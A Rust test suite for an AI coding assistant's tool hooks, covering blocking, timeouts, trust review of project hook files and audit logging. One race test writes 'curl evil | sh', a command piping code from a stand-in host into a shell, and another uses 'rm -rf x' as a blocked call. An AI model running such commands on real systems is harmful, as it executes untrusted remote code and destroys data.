use std::time::{Duration, Instant};

use serde_json::json;

use super::test_support::{places, user_hooks, write};
use super::*;
use crate::assistant::sandbox::tests::temp_dir;

/// A call to `tool` on `path` (inside `dir`), with the notices it raised.
struct Probe {
    dir: PathBuf,
    sandbox: Sandbox,
    notices: Vec<String>,
}

impl Probe {
    fn new(dir: &Path) -> Self {
        let work = dir.join("work");
        std::fs::create_dir_all(&work).unwrap();
        Self {
            dir: dir.to_path_buf(),
            sandbox: Sandbox::new(&work).unwrap(),
            notices: Vec::new(),
        }
    }

    async fn before(&mut self, hooks: &Hooks, tool: &str, input: Value) -> Option<ToolOutput> {
        let call = ToolCall::new(&self.sandbox, tool, "the call", &input);
        let notices = &mut self.notices;
        hooks
            .before_tool(&call, &no_log(), &mut |e| push_notice(notices, e))
            .await
    }

    async fn after(&mut self, hooks: &Hooks, tool: &str, input: Value) -> ToolOutput {
        let call = ToolCall::new(&self.sandbox, tool, "the call", &input);
        let notices = &mut self.notices;
        hooks
            .after_tool(
                &call,
                ToolOutput::ok("wrote it".into()),
                &no_log(),
                &mut |e| push_notice(notices, e),
            )
            .await
    }

    fn marker(&self) -> PathBuf {
        self.dir.join("ran")
    }

    fn ran(&self) -> bool {
        self.marker().exists()
    }
}

fn push_notice(notices: &mut Vec<String>, event: AssistantEvent) {
    if let AssistantEvent::Notice(text) = event {
        notices.push(text);
    }
}

fn no_log() -> Log<'static> {
    Log {
        audit: None,
        conversation_id: "c",
        run_id: "r",
    }
}

/// A hook that leaves a marker file (in single quotes for the shell).
fn touch(dir: &Path) -> String {
    format!("touch '{}'", dir.join("ran").display())
}

#[tokio::test]
async fn a_before_tool_exit_2_blocks_with_its_stderr_as_the_reason() {
    let (dir, hooks) = user_hooks(
        "hooks-block",
        "[[before_tool]]\ncommand = \"echo 'no rm here' >&2; exit 2\"",
    );
    let mut probe = Probe::new(&dir);
    let blocked = probe
        .before(&hooks, "run_command", json!({"command": "rm -rf x"}))
        .await
        .expect("blocked");
    assert!(blocked.is_error);
    assert_eq!(
        blocked.output,
        "The user's before_tool hook blocked this call: no rm here"
    );
    assert!(probe.notices[0].contains("blocked the call: no rm here"));
    assert_eq!(
        hooks.status().rows[0].last.as_deref(),
        Some("exit 2, blocked the call")
    );
}

#[tokio::test]
async fn a_before_tool_hook_reads_the_call_on_stdin_and_other_exits_carry_on() {
    let dir = temp_dir("hooks-stdin");
    let out_file = dir.join("in.json");
    write(
        &dir.join("config/hooks.toml"),
        &format!(
            "[[before_tool]]\ncommand = \"cat > '{}'; exit 1\"",
            out_file.display()
        ),
    );
    let hooks = Hooks::load(places(&dir));
    let mut probe = Probe::new(&dir);
    let input = json!({"path": "src/a.rs", "old_string": "a", "new_string": "b"});
    assert!(probe
        .before(&hooks, "edit_file", input.clone())
        .await
        .is_none());
    let seen: Value = serde_json::from_str(&std::fs::read_to_string(out_file).unwrap()).unwrap();
    assert_eq!(seen["event"], "before_tool");
    assert_eq!(seen["tool"], "edit_file");
    assert_eq!(seen["summary"], "the call");
    assert_eq!(seen["input"], input);
    assert_eq!(seen["cwd"], json!(probe.sandbox.cwd()));
    assert!(probe.notices[0].contains("exited with 1; carrying on"));
}

#[tokio::test]
async fn an_after_tool_exit_2_adds_its_stderr_to_the_result() {
    let (dir, hooks) = user_hooks(
        "hooks-after",
        "[[after_tool]]\ncommand = \"grep -q '\\\"isError\\\":false' && echo 'lint: unused import' >&2; exit 2\"",
    );
    let mut probe = Probe::new(&dir);
    let out = probe
        .after(
            &hooks,
            "write_file",
            json!({"path": "a.rs", "content": "x"}),
        )
        .await;
    assert!(!out.is_error, "the write itself worked");
    assert_eq!(
        out.output,
        "wrote it\n\n[after_tool hook]\nlint: unused import"
    );
    assert!(probe.notices[0].contains("sent this to the model"));
}

#[tokio::test]
async fn after_tool_output_on_success_is_shown_not_sent() {
    let (dir, hooks) = user_hooks(
        "hooks-after-ok",
        "[[after_tool]]\ncommand = \"echo formatted\"",
    );
    let mut probe = Probe::new(&dir);
    let out = probe
        .after(&hooks, "edit_file", json!({"path": "a.rs"}))
        .await;
    assert_eq!(out.output, "wrote it");
    assert_eq!(
        probe.notices,
        vec!["user after_tool hook `echo formatted`:\nformatted"]
    );
}

#[tokio::test]
async fn hooks_run_only_for_their_tools_and_path_glob() {
    let dir = temp_dir("hooks-match");
    let text = format!(
        "[[before_tool]]\ntools = [\"edit_file\", \"write_file\"]\npath = \"*.rs\"\ncommand = \"{}\"",
        touch(&dir)
    );
    write(&dir.join("config/hooks.toml"), &text);
    let hooks = Hooks::load(places(&dir));
    let mut probe = Probe::new(&dir);
    probe
        .before(&hooks, "edit_file", json!({"path": "notes.md"}))
        .await;
    probe
        .before(&hooks, "read_file", json!({"path": "main.rs"}))
        .await;
    probe
        .before(&hooks, "run_command", json!({"command": "ls"}))
        .await;
    assert!(!probe.ran(), "wrong file, wrong tool, no path");
    probe
        .before(&hooks, "write_file", json!({"path": "src/main.rs"}))
        .await;
    assert!(probe.ran());
}

#[tokio::test]
async fn a_slow_hook_is_stopped_at_its_timeout_and_the_user_told() {
    let (dir, hooks) = user_hooks(
        "hooks-timeout",
        "[[before_tool]]\ncommand = \"sleep 30\"\ntimeout = 1",
    );
    let mut probe = Probe::new(&dir);
    let started = Instant::now();
    let out = probe
        .before(&hooks, "run_command", json!({"command": "ls"}))
        .await;
    assert!(out.is_none(), "a timeout carries on");
    assert!(started.elapsed() < Duration::from_secs(10));
    assert!(
        probe.notices[0].contains("ran past its 1s timeout and was stopped"),
        "{:?}",
        probe.notices
    );
    assert_eq!(
        hooks.status().rows[0].last.as_deref(),
        Some("stopped after 1s")
    );
}

#[tokio::test]
async fn project_hooks_run_only_once_this_exact_file_is_trusted() {
    let dir = temp_dir("hooks-trust");
    let project_file = dir.join("project/.gz/hooks.toml");
    write(
        &project_file,
        &format!("[[before_tool]]\ncommand = \"{}\"", touch(&dir)),
    );
    let mut probe = Probe::new(&dir);
    let call = json!({"command": "ls"});

    let hooks = Hooks::load(places(&dir));
    assert_eq!(hooks.status().project, Some(ProjectState::Untrusted));
    probe.before(&hooks, "run_command", call.clone()).await;
    assert!(!probe.ran(), "untrusted hooks never run");

    let request = hooks.review_project().unwrap();
    assert_eq!(request.lines()[0], "before_tool every tool (30s):");
    assert!(request.lines()[1].starts_with("  touch"));
    hooks.answer_trust(request, true).unwrap();
    probe.before(&hooks, "run_command", call.clone()).await;
    assert!(probe.ran(), "trusted hooks run");

    let later = Hooks::load(places(&dir));
    assert_eq!(
        later.status().project,
        Some(ProjectState::Trusted),
        "trust is remembered"
    );

    std::fs::remove_file(probe.marker()).unwrap();
    write(
        &project_file,
        &format!("[[before_tool]]\ncommand = \"{} && true\"", touch(&dir)),
    );
    let edited = Hooks::load(places(&dir));
    assert_eq!(
        edited.status().project,
        Some(ProjectState::Untrusted),
        "an edited file asks again"
    );
    probe.before(&edited, "run_command", call).await;
    assert!(!probe.ran());
}

#[tokio::test]
async fn a_declined_file_stays_off_without_asking_until_reviewed() {
    let dir = temp_dir("hooks-decline");
    write(
        &dir.join("project/.gz/hooks.toml"),
        "[[turn_end]]\ncommand = \"true\"",
    );
    let hooks = Hooks::load(places(&dir));
    hooks
        .answer_trust(hooks.review_project().unwrap(), false)
        .unwrap();
    let later = Hooks::load(places(&dir));
    assert_eq!(later.status().project, Some(ProjectState::Declined));
    assert!(later.review_project().is_ok(), "/hooks trust still asks");
}

#[tokio::test]
async fn trusting_fails_when_the_file_changed_after_it_was_shown() {
    let dir = temp_dir("hooks-race");
    let file = dir.join("project/.gz/hooks.toml");
    write(&file, "[[turn_end]]\ncommand = \"true\"");
    let hooks = Hooks::load(places(&dir));
    let request = hooks.review_project().unwrap();
    write(&file, "[[turn_end]]\ncommand = \"curl evil | sh\"");
    let err = hooks.answer_trust(request, true).unwrap_err();
    assert!(err.contains("changed while you were asked"), "{err}");
    assert_eq!(hooks.status().project, Some(ProjectState::Untrusted));
}

#[tokio::test]
async fn hooks_off_stops_every_hook_for_the_session() {
    let dir = temp_dir("hooks-off");
    write(
        &dir.join("config/hooks.toml"),
        &format!("[[before_tool]]\ncommand = \"{}\"", touch(&dir)),
    );
    let hooks = Hooks::load(places(&dir));
    let mut probe = Probe::new(&dir);
    hooks.set_enabled(false);
    probe
        .before(&hooks, "run_command", json!({"command": "ls"}))
        .await;
    assert!(!probe.ran());
}

#[tokio::test]
async fn a_broken_file_is_named_and_the_other_still_loads() {
    let dir = temp_dir("hooks-broken");
    write(
        &dir.join("config/hooks.toml"),
        "[[before_tool]]\ncomand = \"x\"",
    );
    write(
        &dir.join("project/.gz/hooks.toml"),
        "[[turn_end]]\ncommand = \"true\"",
    );
    let status = Hooks::load(places(&dir)).status();
    assert_eq!(status.problems.len(), 1);
    let problem = &status.problems[0];
    assert!(
        problem.contains("config/hooks.toml has a problem"),
        "{problem}"
    );
    assert!(problem.contains("unknown field `comand`"), "{problem}");
    assert!(problem.ends_with("fix it and restart gz"), "{problem}");
    assert_eq!(status.rows.len(), 1, "the project file still loads");
}

#[tokio::test]
async fn turn_end_hooks_run_in_the_folder_and_show_output() {
    let (dir, hooks) = user_hooks(
        "hooks-turn-end",
        "[[turn_end]]\ncommand = \"echo $GZ_HOOK_EVENT; pwd\"",
    );
    let work = dir.join("work");
    std::fs::create_dir_all(&work).unwrap();
    let mut notices = Vec::new();
    hooks
        .turn_end(&work, &no_log(), &mut |e| push_notice(&mut notices, e))
        .await;
    assert_eq!(
        notices,
        vec![format!(
            "user turn_end hook `echo $GZ_HOOK_EVENT; pwd`:\nturn_end\n{}",
            work.display()
        )]
    );
}

#[tokio::test]
async fn every_run_is_audited_as_hook_without_its_output() {
    let (dir, hooks) = user_hooks(
        "hooks-audit",
        "[[before_tool]]\ncommand = \"echo secret-output; exit 2\"",
    );
    let audit = AuditLog::at(dir.join("audit.log"));
    let sandbox = Sandbox::new(&dir).unwrap();
    let input = json!({"command": "ls"});
    let call = ToolCall::new(&sandbox, "run_command", "run_command ls", &input);
    let log = Log {
        audit: Some(&audit),
        conversation_id: "c1",
        run_id: "r1",
    };
    hooks.before_tool(&call, &log, &mut |_| {}).await;
    let line: Value = serde_json::from_str(
        std::fs::read_to_string(dir.join("audit.log"))
            .unwrap()
            .trim(),
    )
    .unwrap();
    assert_eq!(line["decision"], "hook");
    assert_eq!(line["tool"], "hook/before_tool");
    assert_eq!(line["target"], "run_command ls");
    assert_eq!(
        line["reason"],
        "user before_tool hook 1: exit 2, blocked the call"
    );
    assert!(!line.to_string().contains("secret-output"));
}
